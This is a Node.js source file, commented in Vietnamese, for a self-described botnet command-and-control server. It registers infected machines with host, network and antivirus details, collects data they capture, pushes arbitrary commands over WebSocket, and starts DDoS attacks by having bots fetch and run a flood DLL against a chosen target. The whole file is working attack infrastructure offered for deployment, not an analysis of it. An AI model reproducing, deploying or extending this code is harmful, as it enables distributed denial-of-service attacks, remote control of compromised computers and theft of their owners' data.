// ============================================================
// BOTNET C&C SERVER - NODE.JS + EXPRESS + WEBSOCKET
// Deploy trên Render.com - Web Service
// Database: SQLite (lưu tại /tmp trên Render)
// ============================================================

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const Database = require('better-sqlite3');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const morgan = require('morgan');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

// --- CẤU HÌNH ENVIRONMENT VARIABLES ---
const JWT_SECRET = process.env.JWT_SECRET || 'botnet-jwt-secret-change-in-production-2024';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'P@ssw0rd123!';
const PORT = process.env.PORT || 10000;
const DB_PATH = process.env.DB_PATH || '/tmp/botnet.db';

// --- KHỞI TẠO DATABASE SQLite ---
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

// Tạo bảng nếu chưa tồn tại
db.exec(`
  CREATE TABLE IF NOT EXISTS admins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS bots (
    bot_id TEXT PRIMARY KEY,
    hostname TEXT,
    os_version TEXT,
    cpu_name TEXT,
    ram_total INTEGER,
    ip_local TEXT,
    ip_public TEXT,
    country TEXT,
    is_admin INTEGER DEFAULT 0,
    av_installed TEXT,
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'offline'
  );

  CREATE TABLE IF NOT EXISTS bot_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    bot_id TEXT REFERENCES bots(bot_id),
    data_type TEXT,
    data_content TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS attacks (
    attack_id TEXT PRIMARY KEY,
    target TEXT,
    method TEXT,
    port INTEGER,
    duration INTEGER,
    threads INTEGER,
    pps_limit INTEGER,
    status TEXT DEFAULT 'pending',
    started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    ended_at DATETIME
  );

  CREATE TABLE IF NOT EXISTS attack_bots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    attack_id TEXT REFERENCES attacks(attack_id),
    bot_id TEXT REFERENCES bots(bot_id),
    status TEXT DEFAULT 'assigned'
  );

  CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level TEXT DEFAULT 'info',
    source TEXT,
    message TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS commands (
    command_id TEXT PRIMARY KEY,
    bot_id TEXT REFERENCES bots(bot_id),
    command_type TEXT,
    command_data TEXT,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    executed_at DATETIME
  );
`);

// Tạo admin mặc định nếu chưa có
const existingAdmin = db.prepare('SELECT * FROM admins WHERE username = ?').get(ADMIN_USER);
if (!existingAdmin) {
  const hash = bcrypt.hashSync(ADMIN_PASS, 12);
  db.prepare('INSERT INTO admins (username, password_hash) VALUES (?, ?)').run(ADMIN_USER, hash);
  console.log('[+] Default admin account created');
}

// --- KHỞI TẠO EXPRESS APP ---
const app = express();
const server = http.createServer(app);

// --- MIDDLEWARE ---
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(morgan('combined'));

// Rate limiting cho API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 1000,
  message: { error: 'Too many requests, slow down' }
});
app.use('/api/', apiLimiter);

// Serve static files (admin panel HTML)
app.use(express.static(path.join(__dirname, 'public')));

// --- AUTHENTICATION MIDDLEWARE ---
function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized - No token provided' });
  }
  
  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Unauthorized - Invalid token' });
  }
}

// --- REST API ENDPOINTS ---

// Đăng nhập
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }
  
  const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get(username);
  if (!admin) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  if (!bcrypt.compareSync(password, admin.password_hash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const token = jwt.sign(
    { id: admin.id, username: admin.username, role: 'admin' },
    JWT_SECRET,
    { expiresIn: '24h' }
  );
  
  db.prepare('INSERT INTO logs (level, source, message) VALUES (?, ?, ?)').run(
    'info', 'auth', `Admin ${username} logged in`
  );
  
  res.json({ token, expires_in: 86400 });
});

// Lấy danh sách bot
app.get('/api/bots', authenticateJWT, (req, res) => {
  const { status, country, page = 1, limit = 100 } = req.query;
  
  let query = 'SELECT * FROM bots WHERE 1=1';
  const params = [];
  
  if (status && status !== 'all') {
    query += ' AND status = ?';
    params.push(status);
  }
  
  if (country && country !== 'all') {
    query += ' AND country = ?';
    params.push(country);
  }
  
  const offset = (parseInt(page) - 1) * parseInt(limit);
  query += ' ORDER BY last_seen DESC LIMIT ? OFFSET ?';
  params.push(parseInt(limit), offset);
  
  const bots = db.prepare(query).all(...params);
  const total = db.prepare('SELECT COUNT(*) as count FROM bots').get();
  
  res.json({
    bots,
    total: total.count,
    page: parseInt(page),
    limit: parseInt(limit)
  });
});

// Lấy chi tiết 1 bot
app.get('/api/bots/:id', authenticateJWT, (req, res) => {
  const bot = db.prepare('SELECT * FROM bots WHERE bot_id = ?').get(req.params.id);
  if (!bot) {
    return res.status(404).json({ error: 'Bot not found' });
  }
  
  const botData = db.prepare('SELECT * FROM bot_data WHERE bot_id = ? ORDER BY captured_at DESC LIMIT 50').all(req.params.id);
  const botCommands = db.prepare('SELECT * FROM commands WHERE bot_id = ? ORDER BY created_at DESC LIMIT 20').all(req.params.id);
  
  res.json({ bot, data: botData, commands: botCommands });
});

// Gửi lệnh đến bot
app.post('/api/bots/:id/command', authenticateJWT, (req, res) => {
  const { command_type, command_data } = req.body;
  const botId = req.params.id;
  
  if (!command_type) {
    return res.status(400).json({ error: 'command_type required' });
  }
  
  const commandId = uuidv4();
  
  db.prepare('INSERT INTO commands (command_id, bot_id, command_type, command_data) VALUES (?, ?, ?, ?)').run(
    commandId, botId, command_type, JSON.stringify(command_data || {})
  );
  
  // Gửi lệnh qua WebSocket nếu bot đang online
  const botWs = connectedBots.get(botId);
  if (botWs && botWs.readyState === WebSocket.OPEN) {
    botWs.send(JSON.stringify({
      type: 'command',
      command_id: commandId,
      command_type,
      command_data
    }));
    
    db.prepare('UPDATE commands SET status = ?, executed_at = CURRENT_TIMESTAMP WHERE command_id = ?').run('sent', commandId);
  }
  
  db.prepare('INSERT INTO logs (level, source, message) VALUES (?, ?, ?)').run(
    'info', 'command', `Command ${command_type} sent to bot ${botId}`
  );
  
  res.json({ command_id: commandId, status: 'sent' });
});

// Bắt đầu tấn công DDoS
app.post('/api/attack/start', authenticateJWT, (req, res) => {
  const { target, method, port, duration, threads, pps_limit, bot_ids, method_url, method_export } = req.body;
  
  if (!target || !method || !duration) {
    return res.status(400).json({ error: 'target, method, duration required' });
  }
  
  const attackId = uuidv4();
  
  db.prepare('INSERT INTO attacks (attack_id, target, method, port, duration, threads, pps_limit, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)').run(
    attackId, target, method, port || 443, duration, threads || 100, pps_limit || 0, 'running'
  );
  
  let targetBots = [];
  if (bot_ids && bot_ids.length > 0) {
    targetBots = bot_ids;
  } else {
    // Tất cả bot online
    const onlineBots = db.prepare("SELECT bot_id FROM bots WHERE status = 'online'").all();
    targetBots = onlineBots.map(b => b.bot_id);
  }
  
  // Gán bot vào cuộc tấn công và gửi lệnh
  const attackCommand = {
    type: 'ddos_start',
    attack_id: attackId,
    method: method,
    method_url: method_url || `https://${req.hostname}/methods/${method}.dll`,
    method_export: method_export || 'StartFlood',
    params: {
      target,
      port: port || 443,
      duration,
      threads: threads || 100,
      pps_limit: pps_limit || 0
    }
  };
  
  targetBots.forEach(botId => {
    db.prepare('INSERT INTO attack_bots (attack_id, bot_id) VALUES (?, ?)').run(attackId, botId);
    
    const botWs = connectedBots.get(botId);
    if (botWs && botWs.readyState === WebSocket.OPEN) {
      botWs.send(JSON.stringify(attackCommand));
    }
  });
  
  db.prepare('INSERT INTO logs (level, source, message) VALUES (?, ?, ?)').run(
    'warning', 'ddos', `Attack started: ${target} (${method}) with ${targetBots.length} bots`
  );
  
  res.json({ attack_id: attackId, bots_used: targetBots.length, status: 'running' });
});

// Dừng tấn công
app.post('/api/attack/stop', authenticateJWT, (req, res) => {
  const { attack_id } = req.body;
  
  if (!attack_id) {
    return res.status(400).json({ error: 'attack_id required' });
  }
  
  db.prepare("UPDATE attacks SET status = 'stopped', ended_at = CURRENT_TIMESTAMP WHERE attack_id = ?").run(attack_id);
  
  const attackBots = db.prepare('SELECT bot_id FROM attack_bots WHERE attack_id = ?').all(attack_id);
  
  attackBots.forEach(row => {
    const botWs = connectedBots.get(row.bot_id);
    if (botWs && botWs.readyState === WebSocket.OPEN) {
      botWs.send(JSON.stringify({
        type: 'ddos_stop',
        attack_id: attack_id
      }));
    }
  });
  
  res.json({ status: 'stopped' });
});

// Lấy logs
app.get('/api/logs', authenticateJWT, (req, res) => {
  const { level, limit = 100 } = req.query;
  
  let query = 'SELECT * FROM logs';
  const params = [];
  
  if (level && level !== 'all') {
    query += ' WHERE level = ?';
    params.push(level);
  }
  
  query += ' ORDER BY created_at DESC LIMIT ?';
  params.push(parseInt(limit));
  
  const logs = db.prepare(query).all(...params);
  res.json({ logs });
});

// Dashboard stats
app.get('/api/dashboard', authenticateJWT, (req, res) => {
  const totalBots = db.prepare('SELECT COUNT(*) as count FROM bots').get();
  const onlineBots = db.prepare("SELECT COUNT(*) as count FROM bots WHERE status = 'online'").get();
  const activeAttacks = db.prepare("SELECT COUNT(*) as count FROM attacks WHERE status = 'running'").get();
  const totalData = db.prepare('SELECT COUNT(*) as count FROM bot_data').get();
  
  res.json({
    total_bots: totalBots.count,
    online_bots: onlineBots.count,
    active_attacks: activeAttacks.count,
    total_data_entries: totalData.count
  });
});

// Phục vụ method DLL files
app.get('/methods/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'methods', req.params.filename);
  if (fs.existsSync(filePath)) {
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    fs.createReadStream(filePath).pipe(res);
  } else {
    res.status(404).json({ error: 'Method not found' });
  }
});

// --- WEBSOCKET SERVER ---
const wss = new WebSocket.Server({ server });
const connectedBots = new Map(); // bot_id -> WebSocket
const adminConnections = new Set(); // WebSocket connections từ admin panel

wss.on('connection', (ws, req) => {
  let authenticated = false;
  let botId = null;
  let isAdmin = false;
  ws.isAlive = true;
  
  ws.on('pong', () => { ws.isAlive = true; });
  
  ws.on('message', async (data) => {
    try {
      const message = JSON.parse(data.toString());
      
      // Xác thực
      if (message.type === 'auth') {
        try {
          const decoded = jwt.verify(message.token, JWT_SECRET);
          
          if (message.role === 'bot') {
            // Bot đăng ký
            botId = message.bot_id || uuidv4();
            authenticated = true;
            connectedBots.set(botId, ws);
            
            // Cập nhật/cập nhật bot info
            const existingBot = db.prepare('SELECT * FROM bots WHERE bot_id = ?').get(botId);
            if (existingBot) {
              db.prepare('UPDATE bots SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE bot_id = ?').run('online', botId);
            } else {
              db.prepare('INSERT INTO bots (bot_id, status) VALUES (?, ?)').run(botId, 'online');
            }
            
            ws.send(JSON.stringify({ type: 'auth_success', bot_id: botId }));
            
            // Thông báo cho admin panels
            broadcastToAdmins({ type: 'bot_online', bot_id: botId });
            
          } else if (message.role === 'admin') {
            // Admin panel kết nối
            authenticated = true;
            isAdmin = true;
            adminConnections.add(ws);
            ws.send(JSON.stringify({ type: 'auth_success', role: 'admin' }));
          }
        } catch (err) {
          ws.send(JSON.stringify({ type: 'auth_error', error: 'Invalid token' }));
        }
        return;
      }
      
      if (!authenticated) {
        ws.send(JSON.stringify({ type: 'error', error: 'Not authenticated' }));
        return;
      }
      
      // Xử lý tin nhắn từ bot
      if (botId && !isAdmin) {
        switch (message.type) {
          case 'bot_info':
            // Cập nhật thông tin bot
            db.prepare(`
              UPDATE bots SET 
                hostname = ?, os_version = ?, cpu_name = ?, ram_total = ?,
                ip_local = ?, ip_public = ?, country = ?, is_admin = ?,
                av_installed = ?, last_seen = CURRENT_TIMESTAMP
              WHERE bot_id = ?
            `).run(
              message.hostname, message.os_version, message.cpu_name, message.ram_total,
              message.ip_local, message.ip_public, message.country, message.is_admin ? 1 : 0,
              message.av_installed, botId
            );
            break;
            
          case 'bot_data':
            // Lưu dữ liệu thu thập được
            db.prepare('INSERT INTO bot_data (bot_id, data_type, data_content) VALUES (?, ?, ?)').run(
              botId, message.data_type, JSON.stringify(message.data_content)
            );
            // Chuyển tiếp đến admin panels
            broadcastToAdmins({
              type: 'bot_data',
              bot_id: botId,
              data_type: message.data_type,
              data_content: message.data_content
            });
            break;
            
          case 'attack_status':
            // Cập nhật trạng thái tấn công
            broadcastToAdmins({
              type: 'attack_status',
              attack_id: message.attack_id,
              bot_id: botId,
              stats: message.stats
            });
            break;
            
          case 'attack_error':
            broadcastToAdmins({
              type: 'attack_error',
              attack_id: message.attack_id,
              bot_id: botId,
              error: message.error
            });
            break;
            
          case 'command_result':
            db.prepare('UPDATE commands SET status = ?, executed_at = CURRENT_TIMESTAMP WHERE command_id = ?').run('executed', message.command_id);
            broadcastToAdmins({
              type: 'command_result',
              bot_id: botId,
              command_id: message.command_id,
              result: message.result
            });
            break;
            
          case 'heartbeat':
            ws.isAlive = true;
            db.prepare('UPDATE bots SET last_seen = CURRENT_TIMESTAMP WHERE bot_id = ?').run(botId);
            break;
        }
      }
      
    } catch (err) {
      console.error('WebSocket message error:', err.message);
    }
  });
  
  ws.on('close', () => {
    if (botId) {
      connectedBots.delete(botId);
      db.prepare("UPDATE bots SET status = 'offline' WHERE bot_id = ?").run(botId);
      broadcastToAdmins({ type: 'bot_offline', bot_id: botId });
      
      db.prepare('INSERT INTO logs (level, source, message) VALUES (?, ?, ?)').run(
        'info', 'connection', `Bot ${botId} disconnected`
      );
    }
    if (isAdmin) {
      adminConnections.delete(ws);
    }
  });
  
  ws.on('error', (err) => {
    console.error('WebSocket error:', err.message);
  });
});

// Broadcast đến tất cả admin panels
function broadcastToAdmins(data) {
  const message = JSON.stringify(data);
  adminConnections.forEach(ws => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(message);
    }
  });
}

// Ping/Pong để giữ kết nối WebSocket
const pingInterval = setInterval(() => {
  wss.clients.forEach(ws => {
    if (ws.isAlive === false) {
      return ws.terminate();
    }
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

wss.on('close', () => {
  clearInterval(pingInterval);
});

// --- KHỞI ĐỘNG SERVER ---
server.listen(PORT, () => {
  console.log(`[+] C&C Server running on port ${PORT}`);
  console.log(`[+] WebSocket ready at ws://localhost:${PORT}`);
  console.log(`[+] API ready at http://localhost:${PORT}/api`);
});
